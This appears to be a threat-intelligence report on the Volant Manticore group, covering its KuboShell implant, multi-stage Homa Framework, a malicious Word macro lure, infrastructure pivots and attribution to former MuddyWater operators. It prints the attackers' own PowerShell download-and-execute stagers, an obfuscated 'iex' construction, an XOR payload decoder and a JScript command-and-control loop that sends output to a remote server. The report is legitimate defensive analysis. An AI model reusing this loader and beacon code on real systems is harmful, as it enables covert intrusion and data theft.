$dec -PassThru -Name 'jsc36')[1] $jsc::run() } } ``` The backdoor implements a continuous C2 loop. It sends an initial hi message to hxxp://185.205.187\[.\]109:8000/X{key}, where key is a five-character alphanumeric hard-coded identifier populated per victim to act as a unique identifier. It communicates using the WinHttp.WinHttpRequest.5.1 COM object, which the server-side component checks for its default User-Agent string when handling incoming requests. The server’s response is interpreted as a command. ``` static function httppost(content, key) { try { var objHTTP = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); var url = "http://185.205.187[.]109:8000/X" + key; var data = content + "()" + key; objHTTP.Open("POST", url, false); objHTTP.Send(data); var res = objHTTP.responseText; res = res.slice(1, -1); return res; } ... } static function run() { ... while(true) { ... var cmd = httppost("hi", key); if (cmd.length > 2) { result = ex(cmd); } ... if(result.length > 2) { result = httppost(result, key); } sleep(); } } ``` The backdoor executes received commands according to their prefix: The backdoor reads the command output from the temporary file, strips non-printable characters and blank lines, and then deletes the file. Any output that’s produced is sent back to the C2 server using an HTTP POST request. The loop pauses for ten seconds between iterations. We assess that the third-stage backdoor is designed, at least in part, to execute additional modules which we were unable to recover. The Homa Framework’s third-stage payload closely resembles MuddyWater’s MuddyC2Go framework: We assess that Homa’s client is a JavaScript reimplementation of the older MuddyC2Go client, potentially allowing Volant Manticore to retain the more complex server-side component with minimal modifications, thereby reducing development time and resources. Volant Manticore operators tested KuboShell on their own machines, partially exposing their testing and development environments. MAC address prefixes and network adapter details indicate the use of both VirtualBox and VMware guests. Several VMware guests shared both a NAT subnet and a gateway. As VMware assigns this subnet per installation, these guests were likely running on the same host. Overall, we identified at least two distinct VMware environments in addition to the VirtualBox environment. Taken together, the evidence suggests that at least two operators were engaging with the same Pinata account. One, whom we assess to be KuboShell’s developer, used a VirtualBox environment. The other operator primarily used VMware environments and appears to have been more directly involved in carrying out the campaign, including testing ahead of operational activity. Some of these VMs also had VPN-related virtual adapters installed: The use of the IVPN adapter, a commercial privacy VPN, alongside a Fortinet adapter suggests that the VM might also be used operationally in addition to testing. The Fortinet adapters could indicate that the operators use enterprise VPN connections to access victim environments. Like IVPN, the Kaspersky antivirus adapter can also provide a privacy VPN. However, because this VPN component can be bundled with the antivirus software, we consider it more likely that it reflects an antivirus installation on a machine used to test tooling against that product. In addition, we identified a separate cluster of VMs with Azure-associated configuration that may also represent actor-controlled testing infrastructure. Within the command history, explicit Active Directory discovery commands were limited to this cluster. We suspect Volant Manticore used these VMs to test AD-related functionality in a prepared environment. Pivoting on KuboShell’s developer path led us to a NetLock RMM installer uploaded from Saudi Arabia in September 2026. It communicates with nl-backend\[.\]cnpcyprus\[.\]net. ``` C:\Users\code\source\repos\NetLock-RMM\NetLock RMM Agent Installer\bin\Release\net8.0\win-x64\native\NetLock_RMM_Agent_Installer.pdb ``` Passive DNS records and registration patterns revealed a broader cluster of Cyprus-themed domains: The subdomains (shown below) suggest the infrastructure serves two purposes: The first is **managing RMM tools**, initially, MeshCentral and more recently, NetLock RMM. The second is **credential harvesting**: combined with a GoPhish service observed on one of the servers, the email-themed subdomains suggest phishing campaigns aimed at the email and corporate credentials of at least some of the impersonated organizations. The observed Homa Framework C2 was 185.205.187\[.\]109, but the operator commands revealed the actor also used 185.205.187\[.\]107 in August. This suggests several adjacent addresses were provisioned together. The “missing” address in the series, 185.205.187\[.\]108, led us to an earlier campaign. In January 2026, a malicious Word document named MilitaryHeritageProposal.doc was uploaded to VirusTotal from Cyprus. It shows a blurred page and asks the reader to enable content to see it. We assess the phishing attempt was likely aimed at a Cypriot government entity. The military theme may indicate the target is related to the defense sector. The document hides a VBA backdoor in its macros. Enabling the content triggers execution through one of two paths: one fires shortly after a fake “Microsoft Word is not responding” error message is shown, and the other one fires if the victim closes the document in response. Ahead of running the second stage, the macros set HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Word\\Security\\AccessVBOM to 1, granting programmatic access to the VBA project. It then opens a hidden Word instance, rebuilds the second-stage code from hundreds of encoded fragments, and injects it into that instance. After the second stage runs, every other WINWORD.EXE process, including the one hosting the original document, is terminated. To the victim, Word simply appears to have crashed, and only the hidden instance survives. The backdoor then generates a random 10-character victim ID and registers with the C2 at 185.205.187\[.\]108:25498 over plain HTTP. From there it loops: check for a file to download, wait 20 seconds, poll for a command, wait another 20 seconds. The backdoor handles each command by its prefix: Downloaded files arrive in sequential fragments, which the backdoor reassembles and saves to C:\\Users\\Public under a filename the C2 supplies in the X-Filename HTTP response header. 185.205.187\[.\]108 hosted corenewsnetwork\[.\]com from November to December 2025, and also briefly hosted liveupdatenews\[.\]net. Both are generic news-themed domains and also resolved to 185.106.102\[.\]70 in November 2025. In January 2026, the following URL was scanned on VirusTotal: ``` hxxp://185.106.102[.]70:8080/HK5PpjU6I9ug0zmNZqAFdIPa9wayXl2RZ ``` This URL follows the same pattern as the Homa Framework’s first-stage URLs, which corroborates both the passive DNS pivots and our original pivot to 185.205.187\[.\]108. The timeline matches as well: the document’s metadata shows it was created on January 26 and last saved on January 27, 2026, the same day the URL was scanned. Volant Manticore began targeting Saudi entities in September 2026. In contrast to their earlier, narrowly targeted campaigns in Cyprus, we observed a sudden spike in the group’s phishing activity against Saudi organizations, with a seeming focus on the healthcare sector. **We assess that this shift may indicate that the operators were tasked, with short notice, to rapidly gain access to Saudi targets**: One possible explanation for this apparent shift in targeting priorities is the escalating conflict involving Saudi Arabia and the Iranian-backed Houthis. The departure from the group’s earlier tailored spear-phishing supports two possible explanations. Volant Manticore’s handlers may have prioritized gaining access to a broader set of Saudi organizations over selectively targeting specific entities, or the operators were pushing hard to compromise these targets and sent them multiple lures within a short period, or both. Based on the available evidence, we cannot determine which is the likelier explanation. We assess with high confidence that Volant Manticore is an Iran-nexus threat group, and with medium confidence that it is at least historically linked to Iran’s Ministry of Intelligence and Security (MOIS). However, Iran’s cyber ecosystem is fluid, and the boundaries between the organizations engaged in such activity are not always clear-cut. We therefore cannot rule out that Volant Manticore now operates under a different Iranian entity. Our assessment is based on these findings: We identified several overlaps between Volant Manticore and MuddyWater, including: For a deeper discussion of the attribution, see Appendix 1. **Volant Manticore shows how Iran’s cyber ecosystem continues to reshape itself.** What appears to be a group of former MuddyWater operators now operates independently, pairing legacy MuddyWater tooling with new implants of their own while pursuing a regional focus that has until now drawn little attention. **Distinguishing Volant Manticore from MuddyWater is crucial.** While the two groups currently share part of their tradecraft, we expect Volant Manticore to keep developing its own tooling and TTPs, and the differences between the two groups will become more pronounced over time. **Treating Volant Manticore as part of MuddyWater could therefore lead to blind spots**, particularly for organizations in Saudi Arabia and Cyprus. Cyprus appeared to be Volant Manticore’s primary focus, which makes sense considering the island’s increasing alignment with Iran’s adversaries. In September 2026, however, this pattern changed abruptly. As the conflict between Saudi Arabia and the Houthis escalated, Volant Manticore pivoted to an intensified campaign against Saudi organizations before its tooling and infrastructure were fully ready. **We believe Volant Manticore will continue operating against Saudi Arabia as long as the conflict with the Houthis keeps escalating.** Meanwhile, **Cyprus will likely still remain a consistent target.** More broadly, we expect Volant Manticore to remain responsive to geopolitical developments, potentially shifting its targeting priorities in the event of major changes in the regional situation. Given our assessment that Volant Manticore is composed of former MuddyWater operators, we want to be transparent about our reasoning that led us to this conclusion. Considering the observed overlaps and the fluid nature of Iran’s threat landscape, we weighed several competing hypotheses: Volant Manticore relies on an older MuddyWater C2 framework, which MuddyWater has since replaced. A subgroup operating within MuddyWater would most likely have access to the group’s current tooling, making the **same-actor** hypothesis less likely. Similarly, a **copycat** would most likely imitate MuddyWater’s latest documented tooling, not a retired framework. Volant Manticore’s new custom implants, which serve as “guardrails” for Homa, make this scenario even less likely. A **shared developer** could explain the tooling overlaps, but not the operational ones. While such a developer would likely have access to newer frameworks, Homa reimplements the older MuddyC2Go client and keeps its C2 protocol unchanged. This was likely done to evade existing detections with minimal development effort, leaving the server-side component untouched. Combined with our assessment that KuboShell was built by a single developer, this points to a small group with limited development resources, unlike the developers behind MuddyWater’s frameworks who replaced their tooling over time, most notably after public disclosures. As for **professional ties** and **shared training**, key MuddyWater figures were previously linked to Ravin Academy, described as a talent pipeline for MOIS. Such ties could result in both a common training background and professional relationships between otherwise distinct groups. In fact, MuddyWater’s TTPs have previously overlapped with those of other Iranian actors. Most recently, Proofpoint identified shared TTPs between TA450 (MuddyWater) and UNK\_SmudgedSerpent, which Check Point tracks as Nimbus Manticore. However, both explanations seem less likely in our case. If shared training through Ravin explained the overlaps, we would expect the tooling and TTPs Volant Manticore shares with MuddyWater to be common across Iranian groups. In our observation, they are primarily associated with MuddyWater. As for professional ties, they could explain the UNK\_SmudgedSerpent overlaps, which may reflect a one-off collaboration. Volant Manticore, by contrast, has relied on MuddyWater tooling and TTPs consistently over time. This consistency is better explained by habits formed over years of operating within MuddyWater than by occasional collaboration between two separate threat actors. We also observed no signs of operational cooperation that would indicate ongoing contact, such as common targeting or hand-offs. **Considering all of the above, we assess with medium confidence that Volant Manticore is a separate, independent group composed of former MuddyWater operators who left either individually or as a group. These operators may retain ties to current MuddyWater members, but we assess that the observed overlaps primarily reflect their shared operational history rather than ongoing collaboration.** If MuddyC2Go is the latest MuddyWater framework Volant Manticore’s operators had access to, **the split may have happened around 2023** as MuddyWater replaced MuddyC2Go with DarkBeatC2 in late 2023. We could only trace Volant Manticore’s infrastructure back to 2025, which leaves a visibility gap in between. In addition to tooling, **Volant Manticore’s operators may have appropriated MuddyWater’s work environment.** The username pc, which appears in the lure document’s metadata, was previously associated with MuddyWater’s phishing activity and malware development. While generic usernames usually carry limited weight on their own, we found the same username across several of Volant Manticore’s VMs. One possible explanation is that the operators are reusing VM images previously used by MuddyWater. \[contact-form-7 id=”26727″ title=”SUBSCRIBE TO CYBER INTELLIGENCE REPORTS”\]

On startup, KuboShell checks whether it has administrator privileges. If not, it tries to relaunch itself with higher privileges, which triggers a User Account Control (UAC) prompt.

KuboShell retrieves the MAC address of the machine’s first network adapter and uses it as a unique identifier for each victim. It then registers the host by uploading a file containing hi, saved to C:\\Users\\Public\\.log, using a hard-coded Pinata access token.

After it’s registered, KuboShell checks Pinata for a command file named .txt. If this file exists, KuboShell looks up the file’s IPFS identifier and downloads its contents through Pinata’s public gateway.

The downloaded text is passed to PowerShell in a hidden window. After execution completes, KuboShell attempts to upload C:\\Users\\Public\\re.txt, where the command is expected to write its results. KuboShell does not capture the output itself, so results are returned only if the received command writes them to that file. KuboShell then checks for a new command every 60 seconds.

We analyzed the historical commands issued by the operator and the command output across a time period spanning from May to October 2026, including operator testing conducted during the two months before the first observed phishing attempt.

Based on the operator commands, KuboShell appears to serve as an initial foothold for executing basic reconnaissance commands, particularly quser, whoami, and ipconfig, before downloading and executing a more capable backdoor through a multi-stage PowerShell and JavaScript execution chain. KuboShell therefore appears to function as a “guardrail”, allowing the operators to assess the compromised environment before deploying the final payload, consistent with phishing-based initial access.

In addition to reconnaissance and commands used to retrieve the next stage, the command history includes:

```
list payload persist Get-Variable route print net group "domain admins" /domain nslookup -q=srv _kerberos._tcp ping 10.40.0.174 -n 2 -a netstat -nat Invoke-WebRequest -Uri 'hxxps://remote.medochomie[.]com/api/ClientDownloads/WindowsInstaller/0f3db892-22d4-4479-a7ec-e54a375bd19c' -OutFile "${env:TEMP}\Install-Remotely.ps1" -UseBasicParsing; Start-Process -FilePath 'powershell.exe' -ArgumentList ("-executionpolicy", "bypass", "-f", "${env:TEMP}\Install-Remotely.ps1") -Verb RunAs;
```

The operators sent list, persist, and payload commands to KuboShell, though none of them is a valid PowerShell command. These apparent “mistakes” suggest the operators entered built-in framework commands into the wrong console, which is consistent with the theory that the operators used a modular framework layered on top of the relatively simple JavaScript backdoor that acts as the final stage of this infection chain. As we discuss later in this section, the JavaScript backdoor exhibits links to MuddyWater tooling. Notably, all three commands sent by the operators are known commands in MuddyWater’s dedicated C2 frameworks, such as PhonyC2. This further supports the idea that the backdoor functions as the core module executor within a broader framework – which Check Point Research tracks as the Homa Framework.

From the operator commands, we were able to identify the next-stage payloads. We call this multi-stage post-compromise framework the **Homa Framework.**

The first stage is a simple PowerShell command that requests a payload from a hard-coded IP address, 185.205.187\[.\]109:8000, using a unique URI path assigned to each new client. It then reads the response and executes it in memory.

```
$uri ="http://185.205.187[.]109:8000/{UID}";$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop; Invoke-Expression $response.Content
```

To bypass static analysis and evade signature-based detection, the operators appear to have experimented with different techniques to hide command execution, such as extracting character slices from system paths or default PowerShell preference variables like SpecialFolders\[‘AllUsersStartUp’\]and $PSSessionConfigurationName, to dynamically build execution triggers such as iex.

```
$uri ="http://"+"185"+"."+"205"+"."+"187"+"."+"109"+":8000/{UID}";$req = [System.Net.WebRequest]::Create($uri);$rgr = '$re' + 'q.GetRe' + 'sponse()';$res = .($PSSessionConfigurationName[16] + $PSSessionConfigurationName[10] + 'x') $rgr;$rger = '$res.GetR' + 'espon' + 'seStream()'; $strm = .($PSSessionConfigurationName[16] + $PSSessionConfigurationName[10] + 'x') $rger ;$reader = New-Object System.IO.StreamReader($strm);$content = $reader.ReadToEnd(); .($PSSessionConfigurationName[16] + $PSSessionConfigurationName[10] + 'x') $content
```

The second stage PowerShell script decodes an encoded string using a defined Xor-Decode function. It removes newline characters and processes the input in three-character numeric chunks. The resulting value is passed to Add-Type with the JavaScript language option, after which the script attempts to invoke a static run() method. A while($true) loop repeatedly executes this logic, with exception handling that retries compilation under an alternative type name.

```
function Xor-Decode { param ([string]$EncodedText) $key = [int][char]'o' $result = "" $clean = ($EncodedText -replace "`r|`n", "") for ($i = 0; $i -lt $clean.Length; $i += 3) { $num = [int]$clean.Substring($i, 3) $result += [char]($num -bxor $key) } return $result } $src = "079079079079028027014027006012..." $dec = Xor-Decode $src while($true) { try { $jsc = (add-type -language JScript -MemberDefinition $dec -PassThru -Name 'jsc35')[1] $jsc::run() } catch { $jsc = (add-type -language JScript -MemberDefinition $dec -PassThru -Name 'jsc36')[1] $jsc::run() } }
```

The backdoor implements a continuous C2 loop. It sends an initial hi message to hxxp://185.205.187\[.\]109:8000/X{key}, where key is a five-character alphanumeric hard-coded identifier populated per victim to act as a unique identifier. It communicates using the WinHttp.WinHttpRequest.5.1 COM object, which the server-side component checks for its default User-Agent string when handling incoming requests. The server’s response is interpreted as a command.

```
static function httppost(content, key) { try { var objHTTP = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); var url = "http://185.205.187[.]109:8000/X" + key; var data = content + "()" + key; objHTTP.Open("POST", url, false); objHTTP.Send(data); var res = objHTTP.responseText; res = res.slice(1, -1); return res; } ... } static function run() { ... while(true) { ... var cmd = httppost("hi", key); if (cmd.length > 2) { result = ex(cmd); } ... if(result.length > 2) { result = httppost(result, key); } sleep(); } }
```

The backdoor executes received commands according to their prefix:

The backdoor reads the command output from the temporary file, strips non-printable characters and blank lines, and then deletes the file. Any output that’s produced is sent back to the C2 server using an HTTP POST request. The loop pauses for ten seconds between iterations.

We assess that the third-stage backdoor is designed, at least in part, to execute additional modules which we were unable to recover.

The Homa Framework’s third-stage payload closely resembles MuddyWater’s MuddyC2Go framework:

We assess that Homa’s client is a JavaScript reimplementation of the older MuddyC2Go client, potentially allowing Volant Manticore to retain the more complex server-side component with minimal modifications, thereby reducing development time and resources.

Volant Manticore operators tested KuboShell on their own machines, partially exposing their testing and development environments. MAC address prefixes and network adapter details indicate the use of both VirtualBox and VMware guests. Several VMware guests shared both a NAT subnet and a gateway. As VMware assigns this subnet per installation, these guests were likely running on the same host. Overall, we identified at least two distinct VMware environments in addition to the VirtualBox environment.

Taken together, the evidence suggests that at least two operators were engaging with the same Pinata account. One, whom we assess to be KuboShell’s developer, used a VirtualBox environment. The other operator primarily used VMware environments and appears to have been more directly involved in carrying out the campaign, including testing ahead of operational activity.

Some of these VMs also had VPN-related virtual adapters installed:

The use of the IVPN adapter, a commercial privacy VPN, alongside a Fortinet adapter suggests that the VM might also be used operationally in addition to testing. The Fortinet adapters could indicate that the operators use enterprise VPN connections to access victim environments.

Like IVPN, the Kaspersky antivirus adapter can also provide a privacy VPN. However, because this VPN component can be bundled with the antivirus software, we consider it more likely that it reflects an antivirus installation on a machine used to test tooling against that product.

In addition, we identified a separate cluster of VMs with Azure-associated configuration that may also represent actor-controlled testing infrastructure. Within the command history, explicit Active Directory discovery commands were limited to this cluster. We suspect Volant Manticore used these VMs to test AD-related functionality in a prepared environment.

Pivoting on KuboShell’s developer path led us to a NetLock RMM installer uploaded from Saudi Arabia in September 2026. It communicates with nl-backend\[.\]cnpcyprus\[.\]net.

```
C:\Users\code\source\repos\NetLock-RMM\NetLock RMM Agent Installer\bin\Release\net8.0\win-x64\native\NetLock_RMM_Agent_Installer.pdb
```

Passive DNS records and registration patterns revealed a broader cluster of Cyprus-themed domains:

The subdomains (shown below) suggest the infrastructure serves two purposes: The first is **managing RMM tools**, initially, MeshCentral and more recently, NetLock RMM. The second is **credential harvesting**: combined with a GoPhish service observed on one of the servers, the email-themed subdomains suggest phishing campaigns aimed at the email and corporate credentials of at least some of the impersonated organizations.

The observed Homa Framework C2 was 185.205.187\[.\]109, but the operator commands revealed the actor also used 185.205.187\[.\]107 in August. This suggests several adjacent addresses were provisioned together. The “missing” address in the series, 185.205.187\[.\]108, led us to an earlier campaign.

In January 2026, a malicious Word document named MilitaryHeritageProposal.doc was uploaded to VirusTotal from Cyprus. It shows a blurred page and asks the reader to enable content to see it. We assess the phishing attempt was likely aimed at a Cypriot government entity. The military theme may indicate the target is related to the defense sector.

The document hides a VBA backdoor in its macros. Enabling the content triggers execution through one of two paths: one fires shortly after a fake “Microsoft Word is not responding” error message is shown, and the other one fires if the victim closes the document in response. Ahead of running the second stage, the macros set HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Word\\Security\\AccessVBOM to 1, granting programmatic access to the VBA project. It then opens a hidden Word instance, rebuilds the second-stage code from hundreds of encoded fragments, and injects it into that instance.

After the second stage runs, every other WINWORD.EXE process, including the one hosting the original document, is terminated. To the victim, Word simply appears to have crashed, and only the hidden instance survives. The backdoor then generates a random 10-character victim ID and registers with the C2 at 185.205.187\[.\]108:25498 over plain HTTP. From there it loops: check for a file to download, wait 20 seconds, poll for a command, wait another 20 seconds.

The backdoor handles each command by its prefix:

Downloaded files arrive in sequential fragments, which the backdoor reassembles and saves to C:\\Users\\Public under a filename the C2 supplies in the X-Filename HTTP response header.

185.205.187\[.\]108 hosted corenewsnetwork\[.\]com from November to December 2025, and also briefly hosted liveupdatenews\[.\]net. Both are generic news-themed domains and also resolved to 185.106.102\[.\]70 in November 2025. In January 2026, the following URL was scanned on VirusTotal:

```
hxxp://185.106.102[.]70:8080/HK5PpjU6I9ug0zmNZqAFdIPa9wayXl2RZ
```

This URL follows the same pattern as the Homa Framework’s first-stage URLs, which corroborates both the passive DNS pivots and our original pivot to 185.205.187\[.\]108. The timeline matches as well: the document’s metadata shows it was created on January 26 and last saved on January 27, 2026, the same day the URL was scanned.

Volant Manticore began targeting Saudi entities in September 2026. In contrast to their earlier, narrowly targeted campaigns in Cyprus, we observed a sudden spike in the group’s phishing activity against Saudi organizations, with a seeming focus on the healthcare sector. **We assess that this shift may indicate that the operators were tasked, with short notice, to rapidly gain access to Saudi targets**:

One possible explanation for this apparent shift in targeting priorities is the escalating conflict involving Saudi Arabia and the Iranian-backed Houthis. The departure from the group’s earlier tailored spear-phishing supports two possible explanations. Volant Manticore’s handlers may have prioritized gaining access to a broader set of Saudi organizations over selectively targeting specific entities, or the operators were pushing hard to compromise these targets and sent them multiple lures within a short period, or both. Based on the available evidence, we cannot determine which is the likelier explanation.

We assess with high confidence that Volant Manticore is an Iran-nexus threat group, and with medium confidence that it is at least historically linked to Iran’s Ministry of Intelligence and Security (MOIS). However, Iran’s cyber ecosystem is fluid, and the boundaries between the organizations engaged in such activity are not always clear-cut. We therefore cannot rule out that Volant Manticore now operates under a different Iranian entity.

Our assessment is based on these findings:

We identified several overlaps between Volant Manticore and MuddyWater, including:

For a deeper discussion of the attribution, see Appendix 1.

**Volant Manticore shows how Iran’s cyber ecosystem continues to reshape itself.** What appears to be a group of former MuddyWater operators now operates independently, pairing legacy MuddyWater tooling with new implants of their own while pursuing a regional focus that has until now drawn little attention.

**Distinguishing Volant Manticore from MuddyWater is crucial.** While the two groups currently share part of their tradecraft, we expect Volant Manticore to keep developing its own tooling and TTPs, and the differences between the two groups will become more pronounced over time. **Treating Volant Manticore as part of MuddyWater could therefore lead to blind spots**, particularly for organizations in Saudi Arabia and Cyprus.

Cyprus appeared to be Volant Manticore’s primary focus, which makes sense considering the island’s increasing alignment with Iran’s adversaries. In September 2026, however, this pattern changed abruptly. As the conflict between Saudi Arabia and the Houthis escalated, Volant Manticore pivoted to an intensified campaign against Saudi organizations before its tooling and infrastructure were fully ready.

**We believe Volant Manticore will continue operating against Saudi Arabia as long as the conflict with the Houthis keeps escalating.** Meanwhile, **Cyprus will likely still remain a consistent target.** More broadly, we expect Volant Manticore to remain responsive to geopolitical developments, potentially shifting its targeting priorities in the event of major changes in the regional situation.

Given our assessment that Volant Manticore is composed of former MuddyWater operators, we want to be transparent about our reasoning that led us to this conclusion. Considering the observed overlaps and the fluid nature of Iran’s threat landscape, we weighed several competing hypotheses:

Volant Manticore relies on an older MuddyWater C2 framework, which MuddyWater has since replaced. A subgroup operating within MuddyWater would most likely have access to the group’s current tooling, making the **same-actor** hypothesis less likely. Similarly, a **copycat** would most likely imitate MuddyWater’s latest documented tooling, not a retired framework. Volant Manticore’s new custom implants, which serve as “guardrails” for Homa, make this scenario even less likely.

A **shared developer** could explain the tooling overlaps, but not the operational ones. While such a developer would likely have access to newer frameworks, Homa reimplements the older MuddyC2Go client and keeps its C2 protocol unchanged. This was likely done to evade existing detections with minimal development effort, leaving the server-side component untouched. Combined with our assessment that KuboShell was built by a single developer, this points to a small group with limited development resources, unlike the developers behind MuddyWater’s frameworks who replaced their tooling over time, most notably after public disclosures.

As for **professional ties** and **shared training**, key MuddyWater figures were previously linked to Ravin Academy, described as a talent pipeline for MOIS. Such ties could result in both a common training background and professional relationships between otherwise distinct groups. In fact, MuddyWater’s TTPs have previously overlapped with those of other Iranian actors. Most recently, Proofpoint identified shared TTPs between TA450 (MuddyWater) and UNK\_SmudgedSerpent, which Check Point tracks as Nimbus Manticore.

However, both explanations seem less likely in our case. If shared training through Ravin explained the overlaps, we would expect the tooling and TTPs Volant Manticore shares with MuddyWater to be common across Iranian groups. In our observation, they are primarily associated with MuddyWater. As for professional ties, they could explain the UNK\_SmudgedSerpent overlaps, which may reflect a one-off collaboration. Volant Manticore, by contrast, has relied on MuddyWater tooling and TTPs consistently over time. This consistency is better explained by habits formed over years of operating within MuddyWater than by occasional collaboration between two separate threat actors. We also observed no signs of operational cooperation that would indicate ongoing contact, such as common targeting or hand-offs.

**Considering all of the above, we assess with medium confidence that Volant Manticore is a separate, independent group composed of former MuddyWater operators who left either individually or as a group. These operators may retain ties to current MuddyWater members, but we assess that the observed overlaps primarily reflect their shared operational history rather than ongoing collaboration.**

If MuddyC2Go is the latest MuddyWater framework Volant Manticore’s operators had access to, **the split may have happened around 2023** as MuddyWater replaced MuddyC2Go with DarkBeatC2 in late 2023. We could only trace Volant Manticore’s infrastructure back to 2025, which leaves a visibility gap in between.

In addition to tooling, **Volant Manticore’s operators may have appropriated MuddyWater’s work environment.** The username pc, which appears in the lure document’s metadata, was previously associated with MuddyWater’s phishing activity and malware development. While generic usernames usually carry limited weight on their own, we found the same username across several of Volant Manticore’s VMs. One possible explanation is that the operators are reusing VM images previously used by MuddyWater.
